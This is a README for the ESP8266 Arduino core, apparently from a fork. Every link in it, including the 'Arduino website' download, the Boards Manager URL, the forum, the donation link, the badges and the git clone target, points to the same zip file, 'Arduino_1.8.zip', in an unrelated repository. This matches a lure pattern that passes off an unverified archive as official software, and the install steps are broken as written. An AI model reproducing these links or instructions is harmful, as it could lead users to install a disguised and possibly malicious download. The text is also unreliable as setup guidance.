Arduino core for ESP8266 WiFi chip
===========================================

This project brings support for ESP8266 chip to the Arduino environment. It lets you write sketches using familiar Arduino functions and libraries, and run them directly on ESP8266, no external microcontroller required.

ESP8266 Arduino core comes with libraries to communicate over WiFi using TCP and UDP, set up HTTP, mDNS, SSDP, and DNS servers, do OTA updates, use a file system in flash memory, work with SD cards, servos, SPI and I2C peripherals.

# Contents
- Installing options:
  - [Using Boards Manager](#installing-with-boards-manager)
  - [Using git version](#using-git-version)
  - [Using PlatformIO](#using-platformio)
  - [Building with make](#building-with-make)
- [Documentation](#documentation)
- [Issues and support](#issues-and-support)
- [Contributing](#contributing)  
- [License and credits](#license-and-credits)   

### Installing with Boards Manager ###

Starting with 1.6.4, Arduino allows installation of third-party platform packages using Boards Manager. We have packages available for Windows, Mac OS, and Linux (32 and 64 bit).

- Install Arduino 1.6.8 from the [Arduino website](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip).
- Start Arduino and open Preferences window.
- Enter ```https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip``` into *Additional Board Manager URLs* field. You can add multiple URLs, separating them with commas.
- Open Boards Manager from Tools > Board menu and install *esp8266* platform (and don't forget to select your ESP8266 board from Tools > Board menu after installation).

The best place to ask questions related to this core is ESP8266 community forum: https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip
If you find this forum or the ESP8266 Boards Manager package useful, please consider supporting it with a donation. <br />
[![Donate](https://img.shields.io/badge/paypal-donate-yellow.svg)](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip)

#### Available versions

##### Stable version ![](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip)
Boards manager link: `https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip`

Documentation: [https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip)

##### Staging version ![](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip)
Boards manager link: `https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip`

Documentation: [https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip)

### Using git version
[![Linux build status](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip)](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip) [![codecov.io](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip)](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip)

- Install Arduino 1.6.8
- Go to Arduino directory
- Clone this repository into hardware/esp8266com/esp8266 directory (or clone it elsewhere and create a symlink)
```bash
cd hardware
mkdir esp8266com
cd esp8266com
git clone https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip esp8266
```
- Download binary tools (you need Python 2.7)
```bash
cd esp8266/tools
python get.py
```
- Restart Arduino

### Using PlatformIO

[PlatformIO](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip) is an open source ecosystem for IoT
development with cross platform build system, library manager and full support
for Espressif (ESP8266) development. It works on the popular host OS: Mac OS X, Windows,
Linux 32/64, Linux ARM (like Raspberry Pi, BeagleBone, CubieBoard).

- [What is PlatformIO?](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip)
- [PlatformIO IDE](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip!/platformio-ide)
- Quick Start with [PlatformIO IDE](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip) or [PlatformIO CLI](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip)
- [Advanced using](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip) -
  custom settings, uploading to SPIFFS, Over-the-Air (OTA) or using stage version
- [Integration with other IDE](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip) -
  Atom, CLion, Eclipse, Emacs, NetBeans, Qt Creator, Sublime Text, VIM and Visual Studio
- [Project Examples](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip)

### Building with make

[makeEspArduino](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip) is a generic makefile for any ESP8266 Arduino project.
Using make instead of the Arduino IDE makes it easier to do automated and production builds.


### Documentation

Documentation for latest development version:

- [Reference](doc/reference.md)
- [Libraries](doc/libraries.md)
- [File system](doc/filesystem.md)
- [OTA update](doc/ota_updates/readme.md)
- [Supported boards](doc/boards.md)
- [Change log](doc/changes.md)

### Issues and support ###

If you encounter an issue, you are welcome to submit it here on Github: https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip
Please provide as much context as possible: version which you are using (you can check it in Boards Manager), your sketch code, serial output, board model, IDE settings (board selection, flash size, etc).

If you can not find the answers above, you can also try [ESP8266 Community Forum](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip)

### Contributing

For minor fixes of code and documentation, go ahead and submit a pull request.

Check out the list of issues which are easy to fix — [easy issues for 2.2.0](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip+is%3Aissue+milestone%3A2.2.0+label%3A%22level%3A+easy%22). Working on them is a great way to move the project forward.

Larger changes (rewriting parts of existing code from scratch, adding new functions to the core, adding new libraries) should generally be discussed [in the chat](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip) first.

Feature branches with lots of small commits (especially titled "oops", "fix typo", "forgot to add file", etc.) should be squashed before opening a pull request. At the same time, please refrain from putting multiple unrelated changes into a single pull request.

### License and credits ###

Arduino IDE is developed and maintained by the Arduino team. The IDE is licensed under GPL.

ESP8266 core includes an xtensa gcc toolchain, which is also under GPL.

Esptool written by Christian Klippel is licensed under GPLv2, currently maintained by Ivan Grokhotkov: https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip

Espressif SDK included in this build is under Espressif MIT License.

ESP8266 core files are licensed under LGPL.

[SPI Flash File System (SPIFFS)](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip) written by Peter Andersson is used in this project. It is distributed under MIT license.

[umm_malloc](https://raw.githubusercontent.com/martinez1120/Arduino-1/master/libraries/ESP8266WiFi/examples/HTTPSRequest/Arduino_1.8.zip) memory management library written by Ralph Hempel is used in this project. It is distributed under MIT license.
